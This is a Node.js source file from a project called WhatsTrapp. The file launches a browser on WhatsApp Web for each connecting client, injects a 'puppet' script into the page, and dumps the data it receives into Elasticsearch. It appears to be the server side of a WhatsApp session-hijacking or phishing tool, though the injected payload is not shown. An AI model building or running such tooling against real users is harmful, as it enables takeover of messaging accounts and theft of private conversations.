/**
 * @file lib/puppeteer.js
 *
 * Copyright (C) 2018 | Giacomo Trudu aka `Wicker25`
 *
 * This file is part of WhatsTrapp.
 *
 * WhatsTrapp is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * WhatsTrapp is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with WhatsTrapp. If not, see <https://www.gnu.org/licenses/>.
 */

const Browser = require('./browser');
const Dispatcher = require('./dispatcher');

const ElasticsearchStore = require('./stores/elasticsearch-store');

/**
 * The Puppeteer launches the browse instance and inject the Puppet into the webpage.
 */
class Puppeteer {
    constructor() {
        this._dispatcher = null;
        this._sessions = {};

        this._store = new ElasticsearchStore();
    }

    async live() {
        this._dispatcher = new Dispatcher({ port: 8085 });

        this._dispatcher.on('connection', async (client, request) => {
            client.remoteAddress = request.connection.remoteAddress;
            this._debug(client, 'Connected');
        });

        this._dispatcher.on('disconnect', async (client) => {
            this._debug(client, 'Disconnected');
        });

        this._dispatcher
            .on('start_session', this._startSession.bind(this))
            .on('stop_session',  this._stopSession.bind(this))
            .on('store_data',    this._storeData.bind(this))
            .on('debug',         this._debug.bind(this));
    };

    async _startSession(client) {
        const session = this._accessSession(client);

        if (session.browser) {
            await session.browser.stop();
        }

        const browser = session.browser = new Browser('https://web.whatsapp.com/');

        await browser.launch();
        await browser.injectJS('./dist/bootstrap.js', 'WhatsTrapp.launchPuppet();');
    }

    async _stopSession(client) {
        const session = this._accessSession(client);

        if (session.browser) {
            await session.browser.stop();
        }
    }

    _accessSession(client) {
        const remoteAddress = client.remoteAddress;

        if (typeof this._sessions[remoteAddress] === 'undefined') {
            this._sessions[remoteAddress] = {};
        }

        return this._sessions[remoteAddress];
    }

    async _storeData(client, data) {
        await this._store.dump(client, data);
    }

    _debug(client, data) {
        console.log(`DEBUG[${client.remoteAddress}]:`, data);
    }
}

module.exports = Puppeteer;
